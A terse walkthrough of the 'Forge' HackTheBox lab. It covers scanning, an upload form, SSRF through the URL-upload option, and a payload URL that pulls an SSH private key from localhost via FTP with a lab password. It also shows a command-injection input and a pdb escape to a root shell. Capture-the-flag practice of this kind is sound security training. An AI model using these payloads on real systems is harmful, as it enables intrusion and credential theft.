start with nmap

80
22

***

http


upload functionality found.

try to upload shell.

upload test.php stored at (http://forge.htb/uploads/IGF4lX2xXewxk4koFvdt)

main.js

```javascript
function show_upload_local_file(argument) {
    var form_div = document.getElementById('form-div');
    form_div.innerHTML = `
        <form action="/upload" method="POST" enctype="multipart/form-data">
            <input type="file" name="file" class="file">
            <input name="local" type="hidden" value='1'>
            <br>
            <br>
            <button id="submit-local" type="submit" class="submit">Submit</button>
        </form>
        `;
}

function show_upload_remote_file(argument) {
    var form_div = document.getElementById('form-div');
    form_div.innerHTML = `
    <br><br>
        <form action="/upload" method="POST" enctype="application/x-www-form-urlencoded" >
            <input type="textbox" name="url" class="textbox">
            <input name="remote" type="hidden" value='1'>
            <br>
            <br>
            <button id="submit-remote" type="submit" class="submit">Submit</button>
        </form>
        `;
}


```

if we upload php file it will deleted automatically.

if we upload other than php it will not deleted.

we have two functionalities to upload files.

- Upload local file  
- Upload from url --> maybe ssrf or rfi


***
Advanced exploit using type=url
```
Change "type=file" to "type=url"
Paste URL in text field and hit enter
Using this vulnerability users can upload images from any image URL = trigger an SSRF

```

***

An error occured! Error : HTTPConnectionPool(host='forge.htbstatic', port=80): Max retries exceeded with url: /images/image1.jpg (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7fae1869cd60>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))

it uses django with python. look for rce.

http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1.1.1/.ssh/id_rsa


view-source:http://forge.htb/uploads/vQikPy84lDQ6buiUCKbf

***

start the python script.

login into another ssh terminal.

3 && whoami

pdb open in first ssh connnection.

import os
os.system("sh")

got root shell.